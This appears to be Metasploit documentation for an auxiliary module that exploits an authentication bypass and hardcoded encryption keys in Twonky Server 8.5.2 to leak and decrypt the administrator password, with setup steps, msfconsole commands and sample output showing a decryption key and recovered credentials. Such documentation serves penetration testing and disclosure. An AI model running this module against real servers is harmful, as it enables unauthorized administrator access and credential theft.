## Vulnerable Application
This module leverages an authentication bypass in Twonky Server 8.5.2. By exploiting
an authorization flaw to access a privileged web API endpoint and leak application logs,
encrypted administrator credentials are leaked (CVE-2025-13315). The exploit will then decrypt
these credentials using hardcoded keys (CVE-2025-13316) and login as the administrator.
Expected module output is a username and plain text password for the administrator account.

## Options
No custom options for this module exist.

## Testing
To set up a test environment:
1. Download a vulnerable 8.5.2 build of Twonky Server [here](https://download.twonky.com/8.5.2/) and follow the installation instructions.
2. Go to Settings->Security->Admin account and create an administrator user. The application should prompt for basic authentication after.
3. Restart the server. The credential values are written to logs on startup, so this is a prerequisite for exploitation.
4. Follow the verification steps below.

## Verification Steps
1. Start msfconsole
2. `use auxiliary/gather/twonky_authbypass_logleak`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set RPORT <TARGET_PORT>`
5. `run`

## Scenarios
### Twonky Server on Linux or Windows
```
msf auxiliary(gather/twonky_authbypass_logleak) > show options 

Module options (auxiliary/gather/twonky_authbypass_logleak):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      9000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The URI path to Twonky Server
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(gather/twonky_authbypass_logleak) > set RHOSTS 192.168.181.129
RHOSTS => 192.168.181.129
msf auxiliary(gather/twonky_authbypass_logleak) > run
[*] Running module against 192.168.181.129
[*] Confirming the target is vulnerable
[+] The target is Twonky Server v8.5.2
[*] Attempting to leak the administrator username and encrypted password
[+] The target returned the administrator username: admin
[+] The target returned the encrypted password and key index: 14ee76270058c6e3c9f8cecaaebed4fc5206a1d2066d4f78, 7
[*] Decrypting password using key: jwEkNvuwYCjsDzf5
[+] Credentials decrypted: USER=admin PASS=R7Password123!!!
[*] Auxiliary module execution completed
msf auxiliary(gather/twonky_authbypass_logleak) >
```
